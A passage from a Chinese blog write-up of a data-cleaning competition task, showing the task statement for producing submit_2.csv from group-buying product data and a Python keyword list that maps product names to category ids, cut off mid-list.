class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(final_df)&#125;</span> 条记录&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="2-任务⼆：数据清洗与特征⼯程"><a href="#2-任务⼆：数据清洗与特征⼯程" class="headerlink" title="2.任务⼆：数据清洗与特征⼯程"></a>2.任务⼆：数据清洗与特征⼯程</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">【题⼲描述】<br><br>针对在线团购平台提供的商品数据，您需要爬取后进⾏数据清洗（处理异常销量）和特征⼯程（提取分类编号、统计评论数），按附件模板和任务书要求提交处理后的<span class="hljs-keyword">submit_2.csv⽂件进⾏评分。</span><br><span class="hljs-keyword"></span><br>【答案提交】<br>提交仅包含<span class="hljs-number">4</span>列内容的<span class="hljs-keyword">submit_2.csv⽂件。</span><br><span class="hljs-keyword"></span>• 第⼀列为product_id（需要与在线团购平台⾸⻚选项卡中的商品ID对应，严格按照升序排列）<br>• 第⼆列为sales（清洗后商品销量（负数或空值设为<span class="hljs-number">0</span>））<br>• 第三列为category_id（根据商品名称，⽐对提供的商品分类表，找对最符合的标号）<br>• 第四列为reviews_number（填⼊商品ID下的评论总数，⽆评论则设置为<span class="hljs-number">0</span>）<br></code></pre></td></tr></table></figure><p>根据题目要求，主要是对其分类的情况要多一点关键词：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python">CATEGORY_KEYWORDS = [<br>    (<span class="hljs-number">11</span>, [<span class="hljs-string">&#x27;热水器&#x27;</span>, <span class="hljs-string">&#x27;速热&#x27;</span>, <span class="hljs-string">&#x27;恒温&#x27;</span>, <span class="hljs-string">&#x27;防干烧&#x27;</span>, <span class="hljs-string">&#x27;即热式&#x27;</span>, <span class="hljs-string">&#x27;储水式&#x27;</span>, <span class="hljs-string">&#x27;电热水器&#x27;</span>, <span class="hljs-string">&#x27;燃气热水器&#x27;</span>,<br>          <span class="hljs-string">&#x27;太阳能热水器&#x27;</span>, <span class="hljs-string">&#x27;空气能热水器&#x27;</span>, <span class="hljs-string">&#x27;壁挂炉&#x27;</span>, <span class="hljs-string">&#x27;热水系统&#x27;</span>, <span class="hljs-string">&#x27;回水装置&#x27;</span>, <span class="hljs-string">&#x27;恒温阀&#x27;</span>,<br>          <span class="hljs-string">&#x27;镁棒&#x27;</span>, <span class="hljs-string">&#x27;防电墙&#x27;</span>, <span class="hljs-string">&#x27;速热电热水器&#x27;</span>, <span class="hljs-string">&#x27;零冷水&#x27;</span>, <span class="hljs-string">&#x27;预即双模&#x27;</span>]),<br><br>    (<span class="hljs-number">16</span>, [<span class="hljs-string">&#x27;汽车&#x27;</span>, <span class="hljs-string">&#x27;车载&#x27;</span>, <span class="hljs-string">&#x27;机油&#x27;</span>, <span class="hljs-string">&#x27;轮胎&#x27;</span>, <span class="hljs-string">&#x27;变速箱&#x27;</span>, <span class="hljs-string">&#x27;刹车片&#x27;</span>, <span class="hljs-string">&#x27;雨刷&#x27;</span>, <span class="hljs-string">&#x27;火花塞&#x27;</span>, <span class="hljs-string">&#x27;滤清器&#x27;</span>,<br>          <span class="hljs-string">&#x27;蓄电池&#x27;</span>, <span class="hljs-string">&#x27;行车记录仪&#x27;</span>, <span class="hljs-string">&#x27;车载充电器&#x27;</span>, <span class="hljs-string">&#x27;汽车贴膜&#x27;</span>, <span class="hljs-string">&#x27;脚垫&#x27;</span>, <span class="hljs-string">&#x27;方向盘套&#x27;</span>, <span class="hljs-string">&#x27;防冻液&#x27;</span>,<br>          <span class="hljs-string">&#x27;玻璃水&#x27;</span>, <span class="hljs-string">&#x27;悬挂系统&#x27;</span>, <span class="hljs-string">&#x27;涡轮增压&#x27;</span>, <span class="hljs-string">&#x27;四轮定位&#x27;</span>, <span class="hljs-string">&#x27;钣金喷漆&#x27;</span>, <span class="hljs-string">&#x27;汽车美容&#x27;</span>, <span class="hljs-string">&#x27;车衣&#x27;</span>]),<br><br>    (<span class="hljs-number">15</span>, [<span class="hljs-string">&#x27;玩具&#x27;</span>, <span class="hljs-string">&#x27;乐高&#x27;</span>, <span class="hljs-string">&#x27;积木&#x27;</span>, <span class="hljs-string">&#x27;钢琴&#x27;</span>, <span class="hljs-string">&#x27;吉他&#x27;</span>, <span class="hljs-string">&#x27;拼图&#x27;</span>, <span class="hljs-string">&#x27;遥控车&#x27;</span>, <span class="hljs-string">&#x27;芭比娃娃&#x27;</span>, <span class="hljs-string">&#x27;变形金刚&#x27;</span>,<br>          <span class="hljs-string">&#x27;拼装模型&#x27;</span>, <span class="hljs-string">&#x27;益智玩具&#x27;</span>, <span class="hljs-string">&#x27;早教机&#x27;</span>, <span class="hljs-string">&#x27;磁力片&#x27;</span>, <span class="hljs-string">&#x27;轨道车&#x27;</span>, <span class="hljs-string">&#x27;毛绒玩具&#x27;</span>, <span class="hljs-string">&#x27;电子琴&#x27;</span>, <span class="hljs-string">&#x27;小提琴&#x27;</span>,<br>          <span class="hljs-string">&#x27;架子鼓&#x27;</span>, <span class="hljs-string">&#x27;尤克里里&#x27;</span>, <span class="hljs-string">&#x27;口琴&#x27;</span>, <span class="hljs-string">&#x27;音乐盒&#x27;</span>, <span class="hljs-string">&#x27;画板&#x27;</span>, <span class="hljs-string">&#x27;橡皮泥&#x27;</span>, <span class="hljs-string">&#x27;沙滩玩具&#x27;</span>]),<br><br>    (<span class="hljs-number">22</span>, [<span class="hljs-string">&#x27;医疗&#x27;</span>, <span class="hljs-string">&#x27;体温计&#x27;</span>, <span class="hljs-string">&#x27;血压仪&#x27;</span>, <span class="hljs-string">&#x27;轮椅&#x27;</span>, <span class="hljs-string">&#x27;助行器&#x27;</span>, <span class="hljs-string">&#x27;血糖仪&#x27;</span>, <span class="hljs-string">&#x27;制氧机&#x27;</span>, <span class="hljs-string">&#x27;雾化器&#x27;</span>, <span class="hljs-string">&#x27;听诊器&#x27;</span>,<br>          <span class="hljs-string">&#x27;医用口罩&#x27;</span>, <span class="hljs-string">&#x27;防护服&#x27;</span>, <span class="hljs-string">&#x27;手术刀&#x27;</span>, <span class="hljs-string">&#x27;针灸针&#x27;</span>, <span class="hljs-string">&#x27;理疗仪&#x27;</span>, <span class="hljs-string">&#x27;康复设备&#x27;</span>, <span class="hljs-string">&#x27;助听器&#x27;</span>, <span class="hljs-string">&#x27;呼吸机&#x27;</span>,<br>          <span class="hljs-string">&#x27;护理床&#x27;</span>, <span class="hljs-string">&#x27;血压计&#x27;</span>, <span class="hljs-string">&#x27;血氧仪&#x27;</span>, <span class="hljs-string">&#x27;消毒柜&#x27;</span>, <span class="hljs-string">&#x27;医用纱布&#x27;</span>, <span class="hljs-string">&#x27;棉签&#x27;</span>, <span class="hljs-string">&#x27;创可贴&#x27;</span>]),<br><br>    (<span class="hljs-number">23</span>, [<span class="hljs-string">&#x27;花卉&#x27;</span>, <span class="hljs-string">&#x27;绿植&#x27;</span>, <span class="hljs-string">&#x27;多肉&#x27;</span>, <span class="hljs-string">&#x27;盆栽&#x27;</span>, <span class="hljs-string">&#x27;种子&#x27;</span>, <span class="hljs-string">&#x27;花盆&#x27;</span>, <span class="hljs-string">&#x27;营养土&#x27;</span>, <span class="hljs-string">&#x27;园艺剪&#x27;</span>, <span class="hljs-string">&#x27;喷壶&#x27;</span>, <span class="hljs-string">&#x27;花架&#x27;</span>,<br>          <span class="hljs-string">&#x27;观叶植物&#x27;</span>, <span class="hljs-string">&#x27;鲜花&#x27;</span>, <span class="hljs-string">&#x27;干花&#x27;</span>, <span class="hljs-string">&#x27;花肥&#x27;</span>, <span class="hljs-string">&#x27;杀虫剂&#x27;</span>, <span class="hljs-string">&#x27;生根粉&#x27;</span>, <span class="hljs-string">&#x27;育苗盘&#x27;</span>, <span class="hljs-string">&#x27;苔藓微景观&#x27;</span>,<br>          <span class="hljs-string">&#x27;水培植物&#x27;</span>, <span class="hljs-string">&#x27;兰花&#x27;</span>, <span class="hljs-string">&#x27;仙人掌&#x27;</span>, <span class="hljs-string">&#x27;绿萝&#x27;</span>, <span class="hljs-string">&#x27;富贵竹&#x27;</span>, <span class="hljs-string">&#x27;发财树&#x27;</span>, <span class="hljs-string">&#x27;文竹&#x27;</span>]),<br><br>    (<span class="hljs-number">25</span>, [<span class="hljs-string">&#x27;园艺工具&#x27;</span>, <span class="hljs-string">&#x27;洒水器&#x27;</span>, <span class="hljs-string">&#x27;铲子&#x27;</span>, <span class="hljs-string">&#x27;花盆&#x27;</span>, <span class="hljs-string">&#x27;营养土&#x27;</span>, <span class="hljs-string">&#x27;修枝剪&#x27;</span>, <span class="hljs-string">&#x27;嫁接刀&#x27;</span>, <span class="hljs-string">&#x27;园艺手套&#x27;</span>,<br>          <span class="hljs-string">&#x27;割草机&#x27;</span>, <span class="hljs-string">&#x27;绿篱机&#x27;</span>, <span class="hljs-string">&#x27;树枝粉碎机&#x27;</span>, <span class="hljs-string">&#x27;园艺锯&#x27;</span>, <span class="hljs-string">&#x27;松土器&#x27;</span>, <span class="hljs-string">&#x27;育苗箱&#x27;</span>, <span class="hljs-string">&#x27;自动喷灌&#x27;</span>,<br>          <span class="hljs-string">&#x27;园艺支架&#x27;</span>, <span class="hljs-string">&#x27;接水盘&#x27;</span>, <span class="hljs-string">&#x27;播种器&#x27;</span>, <span class="hljs-string">&#x27;园艺地布&#x27;</span>, <span class="hljs-string">&#x27;防草布&#x27;</span>, <span class="hljs-string">&#x27;智能花盆&#x27;</span>, <span class="hljs-string">&#x27;植物补光灯&#x27;</span>]),<br><br>    (<span class="hljs-number">2</span>, [<span class="hljs-string">&#x27;母婴&#x27;</span>, <span class="hljs-string">&#x27;奶粉&#x27;</span>, <span class="hljs-string">&#x27;尿不湿&#x27;</span>, <span class="hljs-string">&#x27;婴儿车&#x27;</span>, <span class="hljs-string">&#x27;奶瓶&#x27;</span>, <span class="hljs-string">&#x27;吸奶器&#x27;</span>, <span class="hljs-string">&#x27;孕妇装&#x27;</span>, <span class="hljs-string">&#x27;待产包&#x27;</span>, <span class="hljs-string">&#x27;婴儿床&#x27;</span>,<br>         <span class="hljs-string">&#x27;学步车&#x27;</span>, <span class="hljs-string">&#x27;儿童餐椅&#x27;</span>, <span class="hljs-string">&#x27;隔尿垫&#x27;</span>, <span class="hljs-string">&#x27;哺乳枕&#x27;</span>, <span class="hljs-string">&#x27;温奶器&#x27;</span>, <span class="hljs-string">&#x27;婴儿背带&#x27;</span>, <span class="hljs-string">&#x27;防溢乳垫&#x27;</span>,<br>         <span class="hljs-string">&#x27;婴儿湿巾&#x27;</span>, <span class="hljs-string">&#x27;婴儿沐浴露&#x27;</span>, <span class="hljs-string">&#x27;护臀膏&#x27;</span>, <span class="hljs-string">&#x27;婴儿理发器&#x27;</span>, <span class="hljs-string">&#x27;早教玩具&#x27;</span>, <span class="hljs-string">&#x27;婴儿监护器&#x27;</span>]),<br><br>    (<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;手机&#x27;</span>, <span class="hljs-string">&#x27;5G&#x27;</span>, <span class="hljs-string">&#x27;智能机&#x27;</span>, <span class="hljs-string">&#x27;曲面屏&#x27;</span>, <span class="hljs-string">&#x27;骁龙&#x27;</span>, <span class="hljs-string">&#x27;全面屏&#x27;</span>, <span class="hljs-string">&#x27;快充&#x27;</span>, <span class="hljs-string">&#x27;双卡双待&#x27;</span>, <span class="hljs-string">&#x27;游戏手机&#x27;</span>,<br>         <span class="hljs-string">&#x27;拍照手机&#x27;</span>, <span class="hljs-string">&#x27;防水手机&#x27;</span>, <span class="hljs-string">&#x27;折叠屏&#x27;</span>, <span class="hljs-string">&#x27;AMOLED&#x27;</span>, <span class="hljs-string">&#x27;屏下指纹&#x27;</span>, <span class="hljs-string">&#x27;液冷散热&#x27;</span>, <span class="hljs-string">&#x27;超级快充&#x27;</span>,<br>         <span class="hljs-string">&#x27;升降摄像头&#x27;</span>, <span class="hljs-string">&#x27;HiFi音质&#x27;</span>, <span class="hljs-string">&#x27;NFC功能&#x27;</span>, <span class="hljs-string">&#x27;无线充电&#x27;</span>, <span class="hljs-string">&#x27;移动电源&#x27;</span>, <span class="hljs-string">&#x27;手机壳&#x27;</span>]),<br><br>    (<span class="hljs-number">6</span>, [<span class="hljs-string">&#x27;厨房&#x27;</span>, <span class="hljs-string">&#x27;炒锅&#x27;</span>, <span class="hljs-string">&#x27;菜刀&#x27;</span>, <span class="hljs-string">&#x27;砧板&#x27;</span>, <span class="hljs-string">&#x27;洗碗机&#x27;</span>, <span class="hljs-string">&#x27;电饭煲&#x27;</span>, <span class="hljs-string">&#x27;微波炉&#x27;</span>, <span class="hljs-string">&#x27;压力锅&#x27;</span>, <span class="hljs-string">&#x27;榨汁机&#x27;</span>,<br>         <span class="hljs-string">&#x27;空气炸锅&#x27;</span>, <span class="hljs-string">&#x27;料理机&#x27;</span>, <span class="hljs-string">&#x27;破壁机&#x27;</span>, <span class="hljs-string">&#x27;蒸烤箱&#x27;</span>, <span class="hljs-string">&#x27;油烟机&#x27;</span>, <span class="hljs-string">&#x27;燃气灶&#x27;</span>, <span class="hljs-string">&#x27;消毒柜&#x27;</span>, <span class="hljs-string">&#x27;绞肉机&#x27;</span>,<br>         <span class="hljs-string">&#x27;烘焙模具&#x27;</span>, <span class="hljs-string">&#x27;厨房秤&#x27;</span>, <span class="hljs-string">&#x27;磨刀器&#x27;</span>, <span class="hljs-string">&#x27;沥水篮&#x27;</span>, <span class="hljs-string">&#x27;保鲜盒&#x27;</span>, <span class="hljs-string">&#x27;厨房置物架&#x27;</span>]),<br><br>    (<span class="hljs-number">20</span>, [<span class="hljs-string">&#x27;户外&#x27;</span>, <span class="hljs-string">&#x27;帐篷&#x27;</span>, <span class="hljs-string">&#x27;登山杖&#x27;</span>, <span class="hljs-string">&#x27;睡袋&#x27;</span>, <span class="hljs-string">&#x27;冲锋衣&#x27;</span>, <span class="hljs-string">&#x27;登山鞋&#x27;</span>, <span class="hljs-string">&#x27;户外背包&#x27;</span>, <span class="hljs-string">&#x27;野餐垫&#x27;</span>,<br>          <span class="hljs-string">&#x27;烧烤架&#x27;</span>, <span class="hljs-string">&#x27;露营灯&#x27;</span>, <span class="hljs-string">&#x27;指南针&#x27;</span>, <span class="hljs-string">&#x27;求生哨&#x27;</span>, <span class="hljs-string">&#x27;军刀卡&#x27;</span>, <span class="hljs-string">&#x27;速干衣&#x27;</span>, <span class="hljs-string">&#x27;抓绒衣&#x27;</span>, <span class="hljs-string">&#x27;攀岩绳&#x27;</span>,<br>          <span class="hljs-string">&#x27;冰爪&#x27;</span>, <span class="hljs-string">&#x27;滑雪板&#x27;</span>, <span class="hljs-string">&#x27;钓鱼竿&#x27;</span>, <span class="hljs-string">&#x27;浮潜面镜&#x27;</span>, <span class="hljs-string">&#x27;登山扣&#x27;</span>, <span class="hljs-string">&#x27;头灯&#x27;</span>, <span class="hljs-string">&#x27;户外水壶&#x27;</span>]),<br><br>    (<span class="hljs-number">10</span>, [<span class="hljs-string">&#x27;运动&#x27;</span>, <span class="hljs-string">&#x27;跑步机&#x27;</span>, <span class="hljs-string">&#x27;瑜伽垫&#x27;</span>, <span class="hljs-string">&#x27;哑铃&#x27;</span>, <span class="hljs-string">&#x27;泳镜&#x27;</span>, <span class="hljs-string">&#x27;健身车&#x27;</span>, <span class="hljs-string">&#x27;椭圆机&#x27;</span>, <span class="hljs-string">&#x27;仰卧板&#x27;</span>,<br>          <span class="hljs-string">&#x27;运动护具&#x27;</span>, <span class="hljs-string">&#x27;拉力器&#x27;</span>, <span class="hljs-string">&#x27;跳绳&#x27;</span>, <span class="hljs-string">&#x27;羽毛球拍&#x27;</span>, <span class="hljs-string">&#x27;乒乓球桌&#x27;</span>, <span class="hljs-string">&#x27;足球鞋&#x27;</span>, <span class="hljs-string">&#x27;篮球架&#x27;</span>,<br>          <span class="hljs-string">&#x27;运动手环&#x27;</span>, <span class="hljs-string">&#x27;计步器&#x27;</span>, <span class="hljs-string">&#x27;筋膜枪&#x27;</span>, <span class="hljs-string">&#x27;运动水壶&#x27;</span>, <span class="hljs-string">&#x27;运动毛巾&#x27;</span>, <span class="hljs-string">&#x27;运动背包&#x27;</span>]),<br><br>    (<span class="hljs-number">21</span>, [<span class="hljs-string">&#x27;珠宝&#x27;</span>, <span class="hljs-string">&#x27;钻石&#x27;</span>, <span class="hljs-string">&#x27;黄金&#x27;</span>, <span class="hljs-string">&#x27;翡翠&#x27;</span>, <span class="hljs-string">&#x27;铂金&#x27;</span>, <span class="hljs-string">&#x27;K金&#x27;</span>, <span class="hljs-string">&#x27;珍珠&#x27;</span>, <span class="hljs-string">&#x27;和田玉&#x27;</span>, <span class="hljs-string">&#x27;琥珀&#x27;</span>,<br>          <span class="hljs-string">&#x27;蜜蜡&#x27;</span>, <span class="hljs-string">&#x27;珊瑚&#x27;</span>, <span class="hljs-string">&#x27;绿松石&#x27;</span>, <span class="hljs-string">&#x27;红宝石&#x27;</span>, <span class="hljs-string">&#x27;蓝宝石&#x27;</span>, <span class="hljs-string">&#x27;祖母绿&#x27;</span>, <span class="hljs-string">&#x27;婚戒&#x27;</span>, <span class="hljs-string">&#x27;吊坠&#x27;</span>,<br>          <span class="hljs-string">&#x27;手链&#x27;</span>, <span class="hljs-string">&#x27;耳环&#x27;</span>, <span class="hljs-string">&#x27;胸针&#x27;</span>, <span class="hljs-string">&#x27;转运珠&#x27;</span>, <span class="hljs-string">&#x27;生肖挂件&#x27;</span>, <span class="hljs-string">&#x27;文玩核桃&#x27;</span>]),<br><br>    (<span class="hljs-number">14</span>, [<span class="hljs-string">&#x27;酒水&#x27;</span>, <span class="hljs-string">&#x27;红酒&#x27;</span>, <span class="hljs-string">&#x27;白酒&#x27;</span>, <span class="hljs-string">&#x27;威士忌&#x27;</span>, <span class="hljs-string">&#x27;啤酒&#x27;</span>, <span class="hljs-string">&#x27;黄酒&#x27;</span>, <span class="hljs-string">&#x27;清酒&#x27;</span>, <span class="hljs-string">&#x27;伏特加&#x27;</span>, <span class="hljs-string">&#x27;朗姆酒&#x27;</span>,<br>          <span class="hljs-string">&#x27;鸡尾酒&#x27;</span>, <span class="hljs-string">&#x27;起泡酒&#x27;</span>, <span class="hljs-string">&#x27;香槟&#x27;</span>, <span class="hljs-string">&#x27;精酿啤酒&#x27;</span>, <span class="hljs-string">&#x27;果酒&#x27;</span>, <span class="hljs-string">&#x27;保健酒&#x27;</span>, <span class="hljs-string">&#x27;酒具&#x27;</span>, <span class="hljs-string">&#x27;醒酒器&#x27;</span>,<br>          <span class="hljs-string">&#x27;红酒杯&#x27;</span>, <span class="hljs-string">&#x27;酒柜&#x27;</span>, <span class="hljs-string">&#x27;酒窖&#x27;</span>, <span class="hljs-string">&#x27;年份酒&#x27;</span>, <span class="hljs-string">&#x27;原浆酒&#x27;</span>]),<br><br>    (<span class="hljs-number">5</span>, [<span class="hljs-string">&#x27;蔬菜&#x27;</span>, <span class="hljs-string">&#x27;有机&#x27;</span>, <span class="hljs-string">&#x27;绿叶菜&#x27;</span>, <span class="hljs-string">&#x27;西红柿&#x27;</span>, <span class="hljs-string">&#x27;黄瓜&#x27;</span>, <span class="hljs-string">&#x27;胡萝卜&#x27;</span>, <span class="hljs-string">&#x27;土豆&#x27;</span>, <span class="hljs-string">&#x27;辣椒&#x27;</span>, <span class="hljs-string">&#x27;茄子&#x27;</span>,<br>         <span class="hljs-string">&#x27;西兰花&#x27;</span>, <span class="hljs-string">&#x27;菠菜&#x27;</span>, <span class="hljs-string">&#x27;芹菜&#x27;</span>, <span class="hljs-string">&#x27;莲藕&#x27;</span>, <span class="hljs-string">&#x27;菌菇&#x27;</span>, <span class="hljs-string">&#x27;豆角&#x27;</span>, <span class="hljs-string">&#x27;南瓜&#x27;</span>, <span class="hljs-string">&#x27;山药&#x27;</span>, <span class="hljs-string">&#x27;芦笋&#x27;</span>,<br>         <span class="hljs-string">&#x27;秋葵&#x27;</span>, <span class="hljs-string">&#x27;娃娃菜&#x27;</span>, <span class="hljs-string">&#x27;冰草&#x27;</span>, <span class="hljs-string">&#x27;羽衣甘蓝&#x27;</span>, <span class="hljs-string">&#x27;芽苗菜&#x27;</span>]),<br><br>    (<span class="hljs-number">8</span>, [<span class="hljs-string">&#x27;水果&#x27;</span>, <span class="hljs-string">&#x27;进口&#x27;</span>, <span class="hljs-string">&#x27;榴莲&#x27;</span>, <span class="hljs-string">&#x27;车厘子&#x27;</span>, <span class="hljs-string">&#x27;蓝莓&#x27;</span>, <span class="hljs-string">&#x27;草莓&#x27;</span>, <span class="hljs-string">&#x27;芒果&#x27;</span>, <span class="hljs-string">&#x27;奇异果&#x27;</span>, <span class="hljs-string">&#x27;山竹&#x27;</span>,<br>         <span class="hljs-string">&#x27;菠萝蜜&#x27;</span>, <span class="hljs-string">&#x27;牛油果&#x27;</span>, <span class="hljs-string">&#x27;莲雾&#x27;</span>, <span class="hljs-string">&#x27;释迦果&#x27;</span>, <span class="hljs-string">&#x27;火龙果&#x27;</span>, <span class="hljs-string">&#x27;椰子&#x27;</span>, <span class="hljs-string">&#x27;百香果&#x27;</span>, <span class="hljs-string">&#x27;番石榴&#x27;</span>,<br>         <span class="hljs-string">&#x27;杨桃&#x27;</span>, <span class="hljs-string">&#x27;枇杷&#x27;</span>, <span class="hljs-string">&#x27;西梅&#x27;</span>, <span class="hljs-string">&#x27;无花果&#x27;</span>, <span class="hljs-string">&#x27;人参果&#x27;</span>]),<br><br>    (<span class="hljs-number">4</span>, [<span class="hljs-string">&#x27;书籍&#x27;</span>, <span class="hljs-string">&#x27;小说&#x27;</span>, <span class="hljs-string">&#x27;教材&#x27;</span>, <span class="hljs-string">&#x27;儿童读物&#x27;</span>, <span class="hljs-string">&#x27;科技&#x27;</span>, <span class="hljs-string">&#x27;文学&#x27;</span>, <span class="hljs-string">&#x27;历史&#x27;</span>, <span class="hljs-string">&#x27;哲学&#x27;</span>, <span class="hljs-string">&#x27;心理学&#x27;</span>,<br>         <span class="hljs-string">&#x27;经济学&#x27;</span>, <span class="hljs-string">&#x27;计算机&#x27;</span>, <span class="hljs-string">&#x27;编程&#x27;</span>, <span class="hljs-string">&#x27;医学&#x27;</span>, <span class="hljs-string">&#x27;法律&#x27;</span>, <span class="hljs-string">&#x27;建筑&#x27;</span>, <span class="hljs-string">&#x27;艺术&#x27;</span>, <span class="hljs-string">&#x27;摄影&#x27;</span>, <span class="hljs-string">&#x27;旅游指南&#x27;</span>,<br>         <span class="hljs-string">&#x27;字帖&#x27;</span>, <span class="hljs-string">&#x27;绘本&#x27;</span>, <span class="hljs-string">&#x27;百科全书&#x27;</span>, <span class="hljs-string">&#x27;字典&#x27;</span>, <span class="hljs-string">&#x27;考试用书&#x27;</span>]),<br><br>    (<span class="hljs-number">24</span>, [<span class="hljs-string">&#x27;游戏&#x27;</span>, <span class="hljs-string">&#x27;PS5&#x27;</span>, <span class="hljs-string">&#x27;Switch&#x27;</span>, <span class="hljs-string">&#x27;Xbox&#x27;</span>, <span class="hljs-string">&#x27;手柄&#x27;</span>, <span class="hljs-string">&#x27;游戏卡带&#x27;</span>, <span class="hljs-string">&#x27;游戏光盘&#x27;</span>, <span class="hljs-string">&#x27;电竞椅&#x27;</span>,<br>          <span class="hljs-string">&#x27;游戏鼠标&#x27;</span>, <span class="hljs-string">&#x27;机械键盘&#x27;</span>, <span class="hljs-string">&#x27;游戏耳机&#x27;</span>, <span class="hljs-string">&#x27;VR设备&#x27;</span>, <span class="hljs-string">&#x27;游戏周边&#x27;</span>, <span class="hljs-string">&#x27;手办&#x27;</span>, <span class="hljs-string">&#x27;游戏点卡&#x27;</span>,<br>          <span class="hljs-string">&#x27;游戏加速器&#x27;</span>, <span class="hljs-string">&#x27;游戏皮肤&#x27;</span>, <span class="hljs-string">&#x27;游戏账号&#x27;</span>, <span class="hljs-string">&#x27;MOD工具&#x27;</span>, <span class="hljs-string">&#x27;游戏攻略书&#x27;</span>]),<br><br>    (<span class="hljs-number">12</span>, [<span class="hljs-string">&#x27;彩妆&#x27;</span>, <span class="hljs-string">&#x27;口红&#x27;</span>, <span class="hljs-string">&#x27;粉底&#x27;</span>, <span class="hljs-string">&#x27;眼影&#x27;</span>, <span class="hljs-string">&#x27;眉笔&#x27;</span>, <span class="hljs-string">&#x27;腮红&#x27;</span>, <span class="hljs-string">&#x27;遮瑕&#x27;</span>, <span class="hljs-string">&#x27;化妆刷&#x27;</span>, <span class="hljs-string">&#x27;美妆蛋&#x27;</span>,<br>          <span class="hljs-string">&#x27;定妆喷雾&#x27;</span>, <span class="hljs-string">&#x27;睫毛膏&#x27;</span>, <span class="hljs-string">&#x27;眼线笔&#x27;</span>, <span class="hljs-string">&#x27;修容棒&#x27;</span>, <span class="hljs-string">&#x27;高光&#x27;</span>, <span class="hljs-string">&#x27;妆前乳&#x27;</span>, <span class="hljs-string">&#x27;卸妆水&#x27;</span>, <span class="hljs-string">&#x27;美瞳&#x27;</span>,<br>          <span class="hljs-string">&#x27;假睫毛&#x27;</span>, <span class="hljs-string">&#x27;美甲贴&#x27;</span>, <span class="hljs-string">&#x27;化妆镜&#x27;</span>, <span class="hljs-string">&#x27;美容工具&#x27;</span>, <span class="hljs-string">&#x27;香水&#x27;</span>]),<br><br>    (<span class="hljs-number">17</span>, [<span class="hljs-string">&#x27;床上用品&#x27;</span>, <span class="hljs-string">&#x27;四件套&#x27;</span>, <span class="hljs-string">&#x27;羽绒被&#x27;</span>, <span class="hljs-string">&#x27;枕头&#x27;</span>, <span class="hljs-string">&#x27;床垫&#x27;</span>, <span class="hljs-string">&#x27;蚕丝被&#x27;</span>, <span class="hljs-string">&#x27;乳胶枕&#x27;</span>, <span class="hljs-string">&#x27;凉席&#x27;</span>,<br>          <span class="hljs-string">&#x27;床褥&#x27;</span>, <span class="hljs-string">&#x27;床笠&#x27;</span>, <span class="hljs-string">&#x27;被套&#x27;</span>, <span class="hljs-string">&#x27;枕套&#x27;</span>, <span class="hljs-string">&#x27;蚊帐&#x27;</span>, <span class="hljs-string">&#x27;电热毯&#x27;</span>, <span class="hljs-string">&#x27;记忆棉&#x27;</span>, <span class="hljs-string">&#x27;榻榻米&#x27;</span>,<br>          <span class="hljs-string">&#x27;床幔&#x27;</span>, <span class="hljs-string">&#x27;靠垫&#x27;</span>, <span class="hljs-string">&#x27;抱枕&#x27;</span>, <span class="hljs-string">&#x27;床尾凳&#x27;</span>, <span class="hljs-string">&#x27;布艺床&#x27;</span>]),<br><br>    (<span class="hljs-number">18</span>, [<span class="hljs-string">&#x27;洗护&#x27;</span>, <span class="hljs-string">&#x27;洗发水&#x27;</span>, <span class="hljs-string">&#x27;沐浴露&#x27;</span>, <span class="hljs-string">&#x27;牙膏&#x27;</span>, <span class="hljs-string">&#x27;洗面奶&#x27;</span>, <span class="hljs-string">&#x27;护发素&#x27;</span>, <span class="hljs-string">&#x27;身体乳&#x27;</span>, <span class="hljs-string">&#x27;洗手液&#x27;</span>,<br>          <span class="hljs-string">&#x27;洗衣液&#x27;</span>, <span class="hljs-string">&#x27;柔顺剂&#x27;</span>, <span class="hljs-string">&#x27;消毒液&#x27;</span>, <span class="hljs-string">&#x27;洁厕灵&#x27;</span>, 